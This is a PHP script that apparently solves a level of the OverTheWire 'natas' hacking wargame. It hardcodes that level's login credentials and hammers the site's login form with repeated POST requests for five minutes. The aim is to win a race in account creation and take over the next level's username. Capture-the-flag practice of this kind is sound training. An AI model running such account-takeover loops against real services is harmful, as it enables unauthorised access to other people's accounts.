<?php

$creds = "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne";
$url = "http://natas27.natas.labs.overthewire.org";
$input = "username=natas28&password=a";


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_USERPWD, $creds);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $input);

curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=seed");
curl_setopt($ch,CURLOPT_URL, $url);

$res = curl_exec($ch);
$starttime = microtime(true);

$current = $starttime;
$timing = $starttime + 300; #5min
while($current < $timing){



    
    curl_setopt($ch, CURLOPT_POSTFIELDS,$input);
    $res = curl_exec($ch);
    $current = microtime(1);
    $sekun = $current - $starttime;
     
    if(strstr($res, "created")){
        echo $res;
        file_put_contents("log.txt", $res . $sekun . " - Versuch\n", FILE_APPEND);
        break;
    }
}
curl_close($ch);

?>
